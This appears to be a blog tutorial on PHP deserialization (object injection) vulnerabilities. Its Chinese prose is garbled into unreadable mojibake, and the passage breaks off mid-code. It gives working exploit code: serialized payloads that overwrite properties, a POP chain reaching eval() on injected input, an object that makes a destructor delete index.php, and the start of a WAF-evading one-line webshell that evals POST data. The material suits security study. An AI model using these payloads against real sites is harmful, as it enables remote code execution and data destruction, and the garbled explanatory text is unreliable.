<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$foo</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$foo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;foo = <span class="hljs-variable">$foo</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;foo;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> TestClass(<span class="hljs-string">&#x27;Hello&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$class</span>;<br><br><span class="hljs-comment">//è¾“å‡ºï¼šhello</span><br></code></pre></td></tr></table></figure>

<h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª<strong>E_NOTICE</strong>çº§åˆ«çš„é”™è¯¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">const</span> SITE = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;sucker&#x27;</span>, <span class="hljs-string">&#x27;damnGG&#x27;</span>, <span class="hljs-string">&#x27;f**k&#x27;</span>);<br>var_dump(serialize(<span class="hljs-variable">$user</span>));<br><br><span class="hljs-comment">//è¾“å‡ºï¼šO:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:8:&quot;nickname&quot;;s:6:&quot;damnGG&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>å¯¹è±¡ååºåˆ—åŒ–æ—¶ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<code>__wakeup()</code>æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>__wakeup()</code>æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚å¦‚æœä¸å­˜åœ¨ï¼Œè¿”å› voidï¼Œå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œä¸­é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-keyword">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:6:&quot;damnGG&quot;;s:4:&quot;f**k&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize(<span class="hljs-variable">$user_ser</span>));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è¾“å‡ºï¼š</span><br><span class="hljs-comment">object(User)#1 (5) &#123;</span><br><span class="hljs-comment">  [&quot;username&quot;]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;nickname&quot;]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;password&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;order&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;damnGG&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;f**k&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>

<h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>PHP ååºåˆ—åŒ–æ¼æ´åˆå«åš PHP å¯¹è±¡æ³¨å…¥æ¼æ´ï¼Œååºåˆ—åŒ–æ¼æ´çš„æˆå› åœ¨äºä»£ç ä¸­çš„ unserialize() æ¥æ”¶çš„å‚æ•°å¯æ§</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/20201112222505683.png" srcset="/img/loading.gif" lazyload></p>
<p>ä¿®æ”¹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸² ç„¶åä¼ å›ä»£ç è¿›è¡Œååºåˆ—åŒ– è€Œæ­¤æ—¶æ¶æ„ä»£ç å°±è¢«æ‰§è¡Œäº†</p>
<h3 id="è¦†ç›–è¾“å‡º"><a href="#è¦†ç›–è¾“å‡º" class="headerlink" title="è¦†ç›–è¾“å‡º"></a>è¦†ç›–è¾“å‡º</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$a_unser</span> = unserialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<p>æ„é€ </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//å¾—åˆ° O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:11:&quot;hello world&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<p>ä¼ å‚å›å»<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210612154244475.png" srcset="/img/loading.gif" lazyload></p>
<p>ååºåˆ—åŒ–åå°±ä¼šè°ƒç”¨__destruct å‡½æ•°ï¼ŒåŒæ—¶è¦†ç›–$test=demo è¾“å‡º hello world</p>
<h3 id="å›é©¬æª"><a href="#å›é©¬æª" class="headerlink" title="å›é©¬æª"></a>å›é©¬æª</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> foo();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return-&gt;action();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please attack me&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;e);<br>    &#125;<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p>æ„é€ ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> evil();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> index();<br>var_dump(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//å¾—åˆ°ï¼šO:5:&quot;index&quot;:1:&#123;s:13:&quot;indexreturn&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="hljs-comment">//æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹ï¼šO:5:&quot;index&quot;:1:&#123;s:13:&quot;%00index%00return&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/02/.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="æ¶æ„åˆ é™¤-index-php-ç­‰é‡è¦æ–‡ä»¶"><a href="#æ¶æ„åˆ é™¤-index-php-ç­‰é‡è¦æ–‡ä»¶" class="headerlink" title="æ¶æ„åˆ é™¤ index.php ç­‰é‡è¦æ–‡ä»¶"></a>æ¶æ„åˆ é™¤ index.php ç­‰é‡è¦æ–‡ä»¶</h3><p>æŸä¸ª web åº”ç”¨ç¨‹åºä¸­ï¼Œlog.php ç”¨æ¥äº§ç”Ÿä¸´æ—¶ profile.log(æ¯”å¦‚ç”¨æˆ·ä¿®æ”¹ä¸ªäººä¿¡æ¯,ä¿®æ”¹å®Œ(__destruct è¢«è°ƒç”¨)å°±åˆ é™¤è¿™ä¸ªä¸´æ—¶æ—¥å¿—)ï¼Œç›®å½•å‡å¦‚å°±æ˜¯æ ¹ç›®å½•ï¼Œå³å­˜åœ¨ index.php å‰æ log.php æ³„éœ²ï¼Œç„¶åä¿®æ”¹ç”¨æˆ·ä¿¡æ¯æ—¶å¾—çŸ¥ååºåˆ—åŒ–ä¼ å‚å¯æ§ï¼Œè€Œä¸”ä¹Ÿç”¨åˆ°äº†ä¸´æ—¶æ—¥å¿—ã€‚</p>
<p>é‚£ä¹ˆå®éªŒå¼€å§‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//log.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logfile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//logæ–‡ä»¶å</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;profile.log&#x27;</span>;<br>    <span class="hljs-comment">//åˆ›å»ºæ—¥å¿—</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logdata</span>(<span class="hljs-params"><span class="hljs-variable">$log</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;log data:&#x27;</span>.<span class="hljs-variable">$log</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename,<span class="hljs-variable">$log</span>,FILE_APPEND);<br>    &#125;<br>    <span class="hljs-comment">//destrcuctoråˆ é™¤æ—¥å¿—</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Updete successfully!(__destruct deletes &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename.<span class="hljs-string">&#x27;)file.&lt;br /&gt;&#x27;</span>;<br>        unlink(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸€ä¸ªä½¿ç”¨ log.php çš„ç®€å•ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//test.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> LogFile();<br><span class="hljs-comment">// è®¾ç½®æ–‡ä»¶åå’Œè¦å‚¨å­˜çš„æ—¥å¿—æ•°æ®</span><br><span class="hljs-variable">$obj</span>-&gt;filename = <span class="hljs-string">&#x27;somefile.log&#x27;</span>;<br><span class="hljs-variable">$obj</span>-&gt;LogData(<span class="hljs-string">&#x27;Test&#x27;</span>);<br><span class="hljs-comment">// è„šæœ¬ç»“æŸ__destructè¢«è°ƒç”¨somefile.logæ–‡ä»¶è¢«åˆ é™¤</span><br></code></pre></td></tr></table></figure>

<p>æ³¨é‡Šæ‰ log.php ä¸­çš„__destructor() å¦‚ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703014308067.png" srcset="/img/loading.gif" lazyload></p>
<p>è®¿é—® test.php</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703015954924.png" srcset="/img/loading.gif" lazyload></p>
<p>äº§ç”Ÿäº† somefile.log æ–‡ä»¶</p>
<p>æ¢å¤__destructor() å°±è§‚å¯Ÿä¸åˆ°è¿™ä¸ªåˆ›å»ºå’Œåˆ é™¤çš„è¿‡ç¨‹</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703020204896.png" srcset="/img/loading.gif" lazyload></p>
<p>ä½†ç»è¿‡ä¸Šé¢çš„æµ‹è¯• è¯´æ˜ log.php å¯ç”¨</p>
<p>æ¥ä¸‹æ¥ç»§ç»­</p>
<p>è¯¥ç½‘ç«™æœ‰å…¶ä»–åŠŸèƒ½ç‚¹ï¼Œä¹Ÿæ˜¯éœ€è¦åˆ›å»ºä¸´æ—¶æ—¥å¿—æ–‡ä»¶çš„ï¼Œæ‰€ä»¥åŒ…å«äº†åŒä¸€ä¸ªç”Ÿæˆæ—¥å¿—çš„ç±» æ¯”å¦‚æ›´æ–°ç”¨æˆ·ä¿¡æ¯ ä¸‹é¢ç¤ºä¾‹ä»£ç ä¸å«æ›´æ–°æ“ä½œï¼Œæ˜¾ç¤ºä¸€ä¸‹å°± ok äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æä¾›ååºåˆ—åŒ–çš„æ¥å£æ–‡ä»¶ profileupdate.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintData</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&#x27; is &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;age . <span class="hljs-string">&#x27; years old. &lt;br /&gt;&#x27;</span>;<br>	&#125;<br>&#125;<br><span class="hljs-comment">// é‡å»ºç”¨æˆ·è¾“å…¥çš„æ•°æ®</span><br><span class="hljs-variable">$usr</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//evil.php æ³¨æ„ï¼Œç›´æ¥è®¿é—®æ­¤æ–‡ä»¶index.phpä¹Ÿä¼šè¢«åˆ é™¤</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<span class="hljs-comment">//ä¸Šé¢å·²ç»æåˆ°log.phpå·²ç»æ³„éœ²ï¼Œæ•…å¯ä»¥å¦‚æ­¤æ„é€ </span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> logfile();<br><span class="hljs-variable">$object</span>-&gt;filename = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$object</span>).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-comment">//è¾“å‡ºï¼šO:7:&quot;Logfile&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;index.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703014910163.png" srcset="/img/loading.gif" lazyload></p>
<p>index.php æ–‡ä»¶å­˜åœ¨å¯è®¿é—®</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703020742097.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703021610114.png" srcset="/img/loading.gif" lazyload></p>
<p>å¯è§ index.php è¢«æˆåŠŸåˆ é™¤</p>
<h3 id="è¿‡-WAF-ä¸€å¥è¯çš„å°è¯•"><a href="#è¿‡-WAF-ä¸€å¥è¯çš„å°è¯•" class="headerlink" title="è¿‡ WAF ä¸€å¥è¯çš„å°è¯•"></a>è¿‡ WAF ä¸€å¥è¯çš„å°è¯•</h3><p>æŸäº›æƒ…å†µä¸‹ å¯¹ä¸€å¥è¯æœ¨é©¬å˜ç§</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;test);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$test</span>) + <span class="hljs-number">1</span>;<br><span class="hljs-variable">$pp</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:&#x27;</span>.<span class="hljs-variable">$len</span>.<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$test</span>.<span 